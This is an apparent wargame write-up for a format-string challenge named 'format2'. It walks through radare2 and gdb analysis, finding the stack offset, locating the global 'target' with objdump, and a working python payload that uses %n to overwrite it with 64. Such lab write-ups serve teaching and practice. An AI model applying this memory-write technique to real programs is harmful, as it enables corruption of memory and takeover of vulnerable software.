Again we have a format string challenge, let's gonna open it in radare to see how is the vulnerable program.
    $ radare2 format2
    > aaa
    > afl
    > s main
    > pdf

This function main does nothing more than calling the function sym.vuln.

    > s sym.vuln
    > pdf
    > afvf # list the variables
    > afvn buffer format # modify name of variable

This function starts calling fgets with a buffer of size 512 bytes, then we have a call to printf where buffer is given as parameter directly without a string with a "%s" format. Then a variable called "target" that is a global variable is compared with 0x40 (64). So we have to modify target with a value of 64, if we remember from previous exercise, we have to check the offset of our parameter to printf (in dwords), we can calculate it with difference of offsets with gdb.
Later we will use %n to write number of written bytes to a variable.
As we give a 4 bytes of an address, we have to give 60 bytes more, and if we remember from first challenge we can give it as: %.60x
We are gonna start debugging with gdb, and set a breakpoint in the vulnerable printf to get the offsets:

    $ gdb -q ./format2
    > b *0x08048485 # breakpoint in call to printf
    > r
    AAAA.%08x.%08x.%08x
    > x/1wx $esp
    0xbfffef20:     0xbfffef30
    > x/1wx 0xbfffef30
    0xbfffef30:     0x41414141

Okay we are correct, in this way, let's gonna do the difference:

    0xbfffef30 - 0xbfffef20 = 0x10 / 4 = 4

So to modify we have to use the %4$ to access directly that variable, then we can write whatever we want. Now we have to extract the address of target, as it is a global variable we can use objdump:

    $ objdump -t ./format2 | grep target
    080496e4 g  0 .bss  00000004    target

Now we can put directly a python line to write directly to that variable:

    $ python -c 'print "\xe4\x96\x04\x08%.60x%4$n"' | ./format2
    000000000000000000000000000000000000000000000000000000000200
    you have modified the target :)

So finally modified, this was even easier than previous, as the difference between the offsets will be always the same.


